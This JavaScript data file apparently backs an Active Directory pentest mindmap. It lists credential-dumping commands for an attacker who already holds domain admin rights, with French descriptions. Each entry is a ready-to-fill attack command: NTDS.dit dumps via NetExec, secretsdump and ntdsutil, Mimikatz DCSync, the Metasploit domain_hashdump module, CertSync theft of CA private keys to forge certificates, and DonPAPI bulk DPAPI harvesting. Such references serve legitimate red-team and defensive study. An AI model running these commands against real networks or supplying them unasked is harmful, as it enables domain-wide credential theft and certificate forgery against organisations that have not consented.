export const DOMAIN_ADMIN_DATA = [
  {
    name: 'Dump ntds.dit (AD Database)',
    nodes: [
      { 
        label: 'NetExec NTDS Dump', 
        cmd: 'nxc smb <dc_ip> -u <user> -p <password> -d <domain> --ntds', 
        leadsTo: 'Credentials',
        description: 'Utilise NetExec pour dumper à distance tous les hashs NTLM de la base de données du domaine via les API Windows.'
      },
      { 
        label: 'Secretsdump (VSS/DRSUAPI)', 
        cmd: "secretsdump.py '<domain>/<user>:<pass>'@<dc_ip>", 
        leadsTo: 'Credentials',
        description: 'Extrait les hashs du fichier NTDS.dit en utilisant les méthodes de réplication ou les clichés instantanés (VSS).'
      },
      { 
        label: 'NTDSUtil (IFM)', 
        cmd: 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q', 
        leadsTo: 'Credentials',
        description: 'Utilitaire Windows natif créant une copie de la base AD (Install From Media) pour une exfiltration discrète.'
      },
      { 
        label: 'Offline Secretsdump', 
        cmd: 'secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract', 
        leadsTo: 'Crack hash',
        description: 'Analyse et extrait les secrets d\'un fichier NTDS.dit récupéré hors ligne en utilisant la ruche SYSTEM correspondante.'
      }
    ]
  },
  {
    name: 'Lateral Move & Replication',
    nodes: [
      { 
        label: 'Metasploit Domain Hashdump', 
        cmd: 'msf> use windows/gather/credentials/domain_hashdump', 
        leadsTo: 'Credentials',
        description: 'Module post-exploitation Metasploit pour dumper la base NTDS depuis une session compromise sur un DC.'
      },
      { 
        label: 'Mimikatz DCSync', 
        cmd: 'mimikatz "lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator"', 
        leadsTo: 'Credentials',
        description: 'Récupère le hash d\'un utilisateur spécifique sans accès direct à la base de données, en simulant une requête de réplication.'
      }
    ]
  },
  {
    name: 'Grab Backup & Protection Keys',
    nodes: [
      { 
        label: 'CertSync (CA Keys)', 
        cmd: "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>", 
        leadsTo: 'Credentials',
        description: 'Récupère les certificats et clés privées de l\'Autorité de Certification (CA) pour forger des certificats arbitraires.'
      },
      { 
        label: 'DonPAPI Collect (Bulk)', 
        cmd: "donpapi collect -H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk", 
        leadsTo: 'Credentials',
        description: 'Collecte massivement les secrets DPAPI et les clés privées à travers le parc informatique via des droits d\'admin.'
      }
    ]
  }
];